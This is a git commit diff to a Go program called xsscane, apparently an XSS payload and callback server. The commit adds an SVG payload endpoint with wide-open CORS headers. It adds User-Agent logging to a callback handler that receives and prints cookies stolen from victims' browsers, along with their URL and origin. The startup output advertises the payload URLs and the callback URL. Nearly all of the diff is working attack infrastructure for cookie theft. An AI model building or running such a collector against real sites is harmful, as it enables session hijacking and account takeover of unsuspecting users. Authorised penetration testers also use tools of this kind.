7e5a42c09ca0b9ae07e341529ed0e42d480a87ff
Jack Rendor <12821606+jackrendor@users.noreply.github.com>
2024-01-19 04:39:57 +0100

    Added UserAgent in callback and added svg payload

--- xsscane.go
+++ xsscane.go
@@ -14,7 +14,7 @@ import (
 )
 
 var banner string = `
-___    ___ ________   ________  ________  ________  ________   _______      
+ ___    ___ ________   ________  ________  ________  ________   _______      
 |\  \  /  /|\   ____\ |\   ____\|\   ____\|\   __  \|\   ___  \|\  ___ \     
 \ \  \/  / | \  \___|_\ \  \___|\ \  \___|\ \  \|\  \ \  \\ \  \ \   __/|    
  \ \    / / \ \_____  \\ \_____  \ \  \    \ \   __  \ \  \\ \  \ \  \_|/__  
@@ -50,6 +50,28 @@ func rootHandler(w http.ResponseWriter, r *http.Request) {
 	tmpl.Execute(w, r.Host)
 }
 
+func svgHandler(w http.ResponseWriter, r *http.Request) {
+	//http.CanonicalHeaderKey()
+	w.Header().Add("Access-Control-Allow-Origin", "*")
+	w.Header().Add("Access-Control-Allow-Credentials", "true")
+	w.Header().Add("Access-Control-Allow-Headers", "*")
+	w.Header().Add("Content-Type", "image/svg+xml")
+
+	fmt.Printf("\n\n  \u001b[30;102m[%s] Connected\u001b[0m\n", r.RemoteAddr)
+	fmt.Printf("\u001b[93m%s\u001b[0m \u001b[96m%s%s\u001b[0m\n", r.Method, r.Host, r.RequestURI)
+	for key, value := range r.Header {
+		fmt.Printf("\u001b[93m%s\u001b[0m: \u001b[96m%s\u001b[0m\n", key, strings.Join(value, ", "))
+	}
+	body, bodyErr := io.ReadAll(r.Body)
+	if bodyErr != nil {
+		fmt.Println("Error reading body:", bodyErr.Error())
+		return
+	}
+	fmt.Println("\u001b[96m" + string(body) + "\u001b[0m")
+	tmpl, _ := template.ParseFiles("xsscane.svg")
+	tmpl.Execute(w, r.Host)
+}
+
 func callBackFromScript(w http.ResponseWriter, r *http.Request) {
 	w.Header().Add("Access-Control-Allow-Origin", "*")
 	w.Header().Add("Access-Control-Allow-Credentials", "true")
@@ -58,7 +80,7 @@ func callBackFromScript(w http.ResponseWriter, r *http.Request) {
 	if r.Method != "POST" {
 		return
 	}
-	fmt.Printf("  \u001b[30;102m[%s] Connected\u001b[0m\n", r.RemoteAddr)
+	fmt.Printf("  \u001b[30;102m[%s] Callback Received\u001b[0m\n", r.RemoteAddr)
 	var jsonData callBackStruct
 
 	if jsonErr := json.NewDecoder(r.Body).Decode(&jsonData); jsonErr != nil {
@@ -79,6 +101,9 @@ func callBackFromScript(w http.ResponseWriter, r *http.Request) {
 	}
 	fmt.Printf("\u001b[93mURL\u001b[0m: \u001b[96m%s\u001b[0m\n", jsonData.URL)
 	fmt.Printf("\u001b[93mOrigin\u001b[0m: \u001b[96m%s\u001b[0m\n", strings.Join(r.Header.Values("Origin"), ", "))
+	if len(r.UserAgent()) > 0 {
+		fmt.Printf("\u001b[User-Agent\u001b[0m: \u001b[96m%s\u001b[0m\n", r.UserAgent())
+	}
 	fmt.Printf("\u001b[93mX-Forwarded-For\u001b[0m: \u001b[96m%s\u001b[0m\n", strings.Join(r.Header.Values("X-Forwarded-For"), ", "))
 	fmt.Printf("\u001b[93mStolen-Cookie\u001b[0m: \u001b[96m%s\u001b[0m\n", jsonData.Cookie)
 
@@ -86,13 +111,19 @@ func callBackFromScript(w http.ResponseWriter, r *http.Request) {
 
 func main() {
 	var listeningVar string
-	flag.StringVar(&listeningVar, "listen", "0.0.0.0:8000", "Listen address, default: 0.0.0.0:8000")
+	flag.StringVar(&listeningVar, "listen", "0.0.0.0:8000", "Listening address")
 	flag.Parse()
 
 	http.HandleFunc("/callback", callBackFromScript)
 	http.HandleFunc("/", rootHandler)
+	http.HandleFunc("/image.svg", svgHandler)
+
 	fmt.Printf("\u001b[36m%s\u001b[0m\n", banner)
-	fmt.Println("\nListening on:", listeningVar)
+	fmt.Println("\n-----------------")
+	fmt.Println(" Listening on:", listeningVar)
+	fmt.Println(" JavaScript Payload:", listeningVar+"/*")
+	fmt.Println(" SVG Payload:", listeningVar+"/image.svg")
+	fmt.Println(" Callback for Payload:", listeningVar+"/callback")
 	fmt.Println("-----------------")
 	log.Println(http.ListenAndServe(listeningVar, nil))
 }
